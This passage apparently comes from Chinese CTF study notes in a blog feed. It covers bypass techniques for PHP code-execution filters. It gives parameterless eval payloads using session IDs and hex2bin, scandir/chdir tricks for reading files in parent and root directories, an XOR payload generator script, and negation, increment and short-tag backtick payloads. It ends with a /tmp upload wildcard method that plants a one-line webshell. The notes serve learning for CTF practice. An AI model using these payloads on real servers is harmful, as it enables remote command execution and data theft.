class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">?code=<span class="hljs-keyword">eval</span>(end(<span class="hljs-keyword">pos</span>(get_defined_vars())));&amp;cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>把print_r换成<span class="hljs-keyword">eval</span>、assert即可执行命令<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);可替换成其他命令<br><br></code></pre></td></tr></table></figure><p>原理：code中的eval先执行其中的代码然后得到system(‘ls’);<br>然后源码中的eval再执行system(‘ls’)返回结果</p><p>poc脚本：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-63.png"></p><hr><h3 id="利用session（php-5）"><a href="#利用session（php-5）" class="headerlink" title="利用session（php 5）"></a>利用session（php 5）</h3><p><strong>session</strong>（相关知识）</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">session_start</span>()</span><br>启动新会话或者重用现有会话，成功开始会话返回<span class="hljs-variable"><span class="hljs-literal">TRUE</span></span>，反之返回<span class="hljs-variable"><span class="hljs-literal">FALSE</span></span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(session_start());<br>返回1<br><br>?<span class="hljs-attribute">code</span>=print_r(session_id(session_start()));<br>返回PHPSESSID的值<br>可以用Burp Suite修改PHPSESSID的值<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-64.png"></p><h4 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a><strong>实现代码：</strong></h4><p><strong>第一种方法：</strong>读取文件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">?code=<span class="hljs-keyword">show_source(session_id(session_start()));</span><br><span class="hljs-keyword"></span>print_r修改为<span class="hljs-keyword">show_source()</span><br><span class="hljs-keyword"></span>用<span class="hljs-keyword">bp修改PHPSESSID的值为./flag</span><br><span class="hljs-keyword"></span>用<span class="hljs-keyword">show_source读取flag文件源代码</span><br></code></pre></td></tr></table></figure><p><strong>第二种方法：</strong>命令执行</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mel">?code=<span class="hljs-keyword">eval</span>(session_id(sessio_start()));<br>修改外部函数为<span class="hljs-keyword">eval</span>()<br>修改PHPSESSID的值为命令<span class="hljs-string">&#x27;phpinfo();&#x27;</span><br>无法直接执行，需先把命令<span class="hljs-string">&#x27;phpinfo();&#x27;</span>HEX编码转为十六进制，写入PHPSESSID<br>再用hex2bin()函数将十六进制转换为二进制数，用<span class="hljs-keyword">eval</span>执行<br><br>?code=<span class="hljs-keyword">eval</span>(hex2bin(session_id(session_start())));<br>然后就能执行命令了<br>将phpinfo();改为我们想执行的命令即可，例如<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag&#x27;</span>);<br></code></pre></td></tr></table></figure><hr><h3 id="使用scandir-进行文件读取"><a href="#使用scandir-进行文件读取" class="headerlink" title="使用scandir()进行文件读取"></a>使用scandir()进行文件读取</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">读取当前目录下所有文件名<br>?<span class="hljs-attribute">code</span>=print_r(scandir(current(localeconv())))<br><br>读取当前目录下位于第一位的文件<br>?<span class="hljs-attribute">code</span>=show_source(current(array_reverse(scandir(current(localeconv())))));<br><br>查看上级目录中的文件名<br>?<span class="hljs-attribute">code</span>=print_r(scandir(dirname(getcwd())));<br><br>随机读取上级目录中的文件<br>?<span class="hljs-attribute">code</span>=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));<br><br>概率查看根目录下文件名<br>?<span class="hljs-attribute">code</span>=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));<br><br>随机读取根目录下文件<br>?<span class="hljs-attribute">code</span>=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));<br></code></pre></td></tr></table></figure><p>还是那个例题无参数</p><p><strong>只能进行文件读取</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span><br>类似ls，在某文件路径下，把内容以列表形式显示出来<br></code></pre></td></tr></table></figure><p><strong>相关函数：</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-65.png"></p><h4 id="当前目录"><a href="#当前目录" class="headerlink" title="当前目录"></a><strong>当前目录</strong></h4><p><strong>查看当前目录文件名流程</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(localeconv());<br></code></pre></td></tr></table></figure><p>原理：localeconv()显示的数组第一项为”.”，scandir(.)即相对路径，表示读取当前目录下的文件名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">获取字符<span class="hljs-string">&#x27;.&#x27;</span><br>?<span class="hljs-attribute">code</span>=print_r(current(localeconv()));<br></code></pre></td></tr></table></figure><p>current()功能同pos()，获取数组第一位</p><p><strong>scandir()读取当前目录下所有文件名</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(scandir(current(localeconv())));<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">倒序<br>?<span class="hljs-attribute">code</span>=print_r(array_reverse(scandir(current(localeconv())));<br><br>?<span class="hljs-attribute">code</span>=print_r(current(array_reverse(scandir(current(localeconv()))));<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-66.png"></p><p><strong>读取当前目录下位于第一位的文件</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">?code=show_source(<span class="hljs-literal">current</span>(array_reverse(scandir(<span class="hljs-literal">current</span>(localeconv())))))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这样就能读取flag文件了</p><p><strong>把第一个current换成next即可读取第二位的文件</strong></p><p><strong>getcwd</strong></p><p>也可以使用getcwd来得到当前目录的绝对路径然后再使用scandir(getcwd())读取当前目录下的文件名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">查看和读取当前目录文件<br>?<span class="hljs-attribute">code</span>=print_r(getcwd());<br></code></pre></td></tr></table></figure><p>getcwd()当前目录，相当于pwd</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(scandir(getcwd()));<br><br>?<span class="hljs-attribute">code</span>=print_r(end(scandir(getcwd())));<br><br>?<span class="hljs-attribute">code</span>=prin_r(show_source(end(scandir(getcwd()))));<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-67.png"></p><h4 id="上级目录"><a href="#上级目录" class="headerlink" title="上级目录"></a>上级目录</h4><p><strong>查看上一级目录文件名流程</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(getcwd());<br></code></pre></td></tr></table></figure><p>getcwd()当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">先使用getcwd()得到当前目录，再使用<span class="hljs-built_in">dirname</span>()得到上一级目录<br>?code=print_r(<span class="hljs-built_in">dirname</span>(getcwd()));<br></code></pre></td></tr></table></figure><p>dirname()上一级目录</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-68.png"></p><p><strong>再加上scandir()即可查看上级目录中的文件名</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(scandir(dirname(getcwd())));<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>ode=print_r(scandir(<span class="hljs-keyword">next</span>(dirname(getcwd()))));<br></code></pre></td></tr></table></figure><p><strong>效果相同</strong></p><p>注意：<strong>但是这里无法使用show_source来读取文件，因为我们无法在当前目录下读取上一级目录中的文件，所以要使用chdir()修改我们执行命令所在的路径</strong></p><hr><p><strong>读取上一级目录文件名</strong></p><p>chdir()相当于cd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">这样就能打印上级目录的文件名了<br>?code=print_r(scandir(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">chdir</span>(<span class="hljs-built_in">dirname</span>(getcwd())))))<br></code></pre></td></tr></table></figure><p>如果想读取上级目录中的文件，把print_r换成show_source，并且使用pos()，current()，end()即可</p><hr><p><strong>如果我们读取的文件顺序不在第一位或者最后一位，可以使用array_rand(array_flip())</strong></p><p><strong>原理：array_flip可以将数组中的键和值互换，array_rand可以随机取出数组中的键，两个函数结合我们就能有概率的得到我们想要的文件名，然后使用show_source即可读取我们想要读取的文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=show_source(array_rand(array_flip(scandir(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">chdir</span>(<span class="hljs-built_in">dirname</span>(getcwd())))))));<br></code></pre></td></tr></table></figure><p>其他方法：</p><p>太多函数了懒得手敲了</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-69.png"></p><h4 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h4><p><strong>查看根目录文件名</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">原理：在序列化并加密后在字符串末尾可能会出现<span class="hljs-string">&#x27;/&#x27;</span>然后这时再使用strrev函数来反转字符串，字符串首位就是<span class="hljs-string">&#x27;/&#x27;</span>了<br><br>?<span class="hljs-attribute">code</span>=print_r(array());<br><br>serialize()序列化<br>crypt单向字符串散列加密，结果随机<br>?<span class="hljs-attribute">code</span>=print_r(crypt(serialize(array())));<br><br>倒序<br>?<span class="hljs-attribute">code</span>=print_r(strrev(crypt(serialize(array()))));<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-70.png"></p><hr><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">ord</span>()函数和<span class="hljs-built_in">chr</span>()函数<br>只能对第一个字符进行转码<br><span class="hljs-built_in">ord</span>()编码，<span class="hljs-built_in">chr</span>()解码<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">原理：使用<span class="hljs-keyword">ord</span>去编码第一个字符（相当于取出第一个字符，这里有概率是/），然后使用<span class="hljs-keyword">chr</span>去解码（将编码后的/解码），然后使用scandir()去查看根目录下的文件名<br><br>?code=print_r(scandir(<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(strrev(<span class="hljs-keyword">crypt</span>(serialize(array())))))));<br></code></pre></td></tr></table></figure><p><strong>读取根目录下的文件</strong></p><p>依然是使用前面的array_rand(array_flip())，还要使用chdir固定当前目录</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?code=show_source(array_rand(array_flip(scandir(dirname(<span class="hljs-keyword">chdir</span>(<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(strrev(<span class="hljs-keyword">crypt</span>(serialize(array())))))))))));<br></code></pre></td></tr></table></figure><p>但是这里双重概率，导致概率很低，所以可以使用burpsuite抓包到intruder，然后暴力破解</p><h2 id="无字母数字异或运算绕过"><a href="#无字母数字异或运算绕过" class="headerlink" title="无字母数字异或运算绕过"></a>无字母数字异或运算绕过</h2><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-71.png"></p><p>a-z0-9过滤字母和数字</p><h3 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h3><p>概念：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-72.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">echo <span class="hljs-built_in">base_convert</span>(<span class="hljs-built_in">bin2hex</span>(<span class="hljs-string">&#x27;5&#x27;</span>),<span class="hljs-number">16</span>,<span class="hljs-number">2</span>)<span class="hljs-number">00110101</span><br>echo <span class="hljs-built_in">base_convert</span>(<span class="hljs-built_in">bin2hex</span>(<span class="hljs-string">&#x27;Z&#x27;</span>),<span class="hljs-number">16</span>,<span class="hljs-number">2</span>)<span class="hljs-number">01011010</span><br><span class="hljs-string">&#x27;5&#x27;</span>^<span class="hljs-string">&#x27;Z&#x27;</span><span class="hljs-number">01101111</span><br>解码得到o<br></code></pre></td></tr></table></figure><p><strong>使用符号进行异或运算，获取想要得到的值</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-73.png"></p><h3 id="异或运算生成脚本"><a href="#异或运算生成脚本" class="headerlink" title="异或运算生成脚本"></a>异或运算生成脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;_FILE_&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&quot;phpinfo&quot;</span>; <span class="hljs-comment">//改成我们想要异或运算得到的值</span><br><span class="hljs-variable">$result1</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$result2</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">judge</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$c</span>))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$num</span>&lt;=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$shell</span>);<span class="hljs-variable">$num</span>++)<br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$x</span>=<span class="hljs-number">33</span>;<span class="hljs-variable">$x</span>&lt;=<span class="hljs-number">126</span>;<span class="hljs-variable">$x</span>++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">judge</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>)))<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$y</span>=<span class="hljs-number">33</span>;<span class="hljs-variable">$y</span>&lt;=<span class="hljs-number">126</span>;<span class="hljs-variable">$y</span>++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">judge</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>))) <br>                &#123;<br>                    <span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>) ^ <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$f</span> == <span class="hljs-variable">$shell</span>[<span class="hljs-variable">$num</span>]) <br>                    &#123;<br>                        <span class="hljs-variable">$result1</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>);<br>                        <span class="hljs-variable">$result2</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>);<br>                        <span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;异或运算第一部分：&quot;</span>.<span class="hljs-variable">$result1</span>.<span class="hljs-string">&quot;  &quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;异或运算第二部分：&quot;</span>.<span class="hljs-variable">$result2</span>;<br></code></pre></td></tr></table></figure><hr><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-74.png"></p><p>注意：要先在hackbar中url编码才能生效</p><h3 id="PHP5-POST方法绕过"><a href="#PHP5-POST方法绕过" class="headerlink" title="PHP5 POST方法绕过"></a>PHP5 POST方法绕过</h3><p>注意：要先在hackbar中url编码才能生效</p><p>具体思路：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-75.png"></p><h3 id="PHP7-反引号-POST绕过"><a href="#PHP7-反引号-POST绕过" class="headerlink" title="PHP7 反引号+POST绕过"></a>PHP7 反引号+POST绕过</h3><p><strong>PHP7之后的版本无法使用assert拼接，所以使用反引号+POST绕过</strong></p><p>注意：&#96;&#96;不能回显，且执行前也要使用ur编码</p><p>具体思路：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-76.png"></p><h2 id="无字母数字取反绕过"><a href="#无字母数字取反绕过" class="headerlink" title="无字母数字取反绕过"></a>无字母数字取反绕过</h2><h3 id="取反运算"><a href="#取反运算" class="headerlink" title="取反运算"></a>取反运算</h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-77.png"></p><p>原理：先将我们的命令字符从ascii码转换成二进制，然后再取反，再转换为十六进制数，这样就能使用url解码然后再取反即可变成命令字符</p><h3 id="取反poc"><a href="#取反poc" class="headerlink" title="取反poc"></a>取反poc</h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-78.png"></p><p><strong>使用中文字符构造payload</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-79.png"></p><p><strong>使用url编码（简单）</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-80.png"></p><h3 id="PHP-7url编码"><a href="#PHP-7url编码" class="headerlink" title="PHP 7url编码"></a>PHP 7url编码</h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-81.png"></p><h2 id="无字母数字自增绕过"><a href="#无字母数字自增绕过" class="headerlink" title="无字母数字自增绕过"></a>无字母数字自增绕过</h2><p>原理：利用自增符号++来实现绕过，[]在php中直接echo是Array但是不能取出首字母A，这时我们使用$_&#x3D;[].’’;拼接’’字符串，这样$_[0]即为A，其他字母就可以由这个A自增自减来得到</p><h3 id="-5"><a href="#-5" class="headerlink" title="++"></a><strong>++</strong></h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-82.png"></p><h3 id="PHP5"><a href="#PHP5" class="headerlink" title="PHP5"></a>PHP5</h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-83.png"></p><p><strong>poc脚本：</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-84.png"></p><h3 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a><strong>PHP7</strong></h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-85.png"></p><h2 id="无字母数字特殊符号绕过"><a href="#无字母数字特殊符号绕过" class="headerlink" title="无字母数字特殊符号绕过"></a>无字母数字特殊符号绕过</h2><h3 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h3><p>例题：a-z0-9_过滤字母和数组、下划线</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>()<br><span class="hljs-meta">?&gt;</span><br><br>短标签<br><span class="hljs-meta">&lt;?=</span><span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span>可直接执行<br></code></pre></td></tr></table></figure><p><strong>GET方式提交</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`</span><span class="hljs-string">?&gt;</span><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`$_GET[%a0]`</span><span class="hljs-string">?&gt;</span>取反<br><br><span class="hljs-symbol">payload:</span><br><span class="hljs-string">?c</span>md=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`</span><span class="hljs-string">?&gt;</span>&amp;%a0=ls<br></code></pre></td></tr></table></figure><p><strong>POST方式提交</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`&#123;$&#123;~&quot;%a0%af%b0%ac%ab&quot;&#125;[&quot;-&quot;]&#125;`</span><span class="hljs-string">?&gt;</span><span class="hljs-string">?&gt;</span><span class="hljs-string">?=</span><span class="hljs-string">`_POST[-]`</span><span class="hljs-string">?&gt;</span>取反<br><br><span class="hljs-symbol">payload:</span><br><span class="hljs-string">?c</span>md=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`&#123;$&#123;~&quot;%a0%af%b0%ac%ab&quot;&#125;[&quot;-&quot;]&#125;`</span><span class="hljs-string">?&gt;</span><br><br>然后<span class="hljs-variable constant_">POST</span>提交-=ls即可执行命令<br></code></pre></td></tr></table></figure><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>PHP中POST上传文件会把我们上传的文件暂时存在&#x2F;tmp目录下</p><p>默认文件名是phpXXXXXX，文件名最后6个字符是随机的大小写字母</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">./<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br><span class="hljs-string">?通</span>配符，可以匹配到./tmp/phpXXXXXX，能匹配到的东西太多，通常会报错<br><br>./<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span>[@-[]<br>[@-[]表示<span class="hljs-variable constant_">ASCII</span>在@和[之间的字符，也就是大写字母，保障最后一位位大写字母<br></code></pre></td></tr></table></figure><p>具体实现步骤：</p><p>一：先构造一个文件上传的POST数据包；</p><p>二：PHP页面生成临时文件phpXXXXXX，存储在&#x2F;tmp目录下；</p><p>三：执行指令.&#x2F;???&#x2F;??????[@-[]，读取文件执行其中指令；</p><p>四：在上传的文件中写入一句话木马，把木马生成位置指定一个绝对路径，直接执行；</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-87.png"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">payload:</span><br><span class="hljs-string">?c</span>md=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`.+/???/????????[@-[]`</span>;<span class="hljs-string">?&gt;</span><br>插入url编码，除了<span class="hljs-title class_">Host</span>其他部分直接修改<br></code></pre></td></tr></table></figure><p>图中的做法是输出一句话木马语句然后写入到success.php文件中</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web82</title>
      <link href="/2025/01/29/ctfshow-web82/"/>
      <url>/2025/01/29/ctfshow-web82/</url>
      
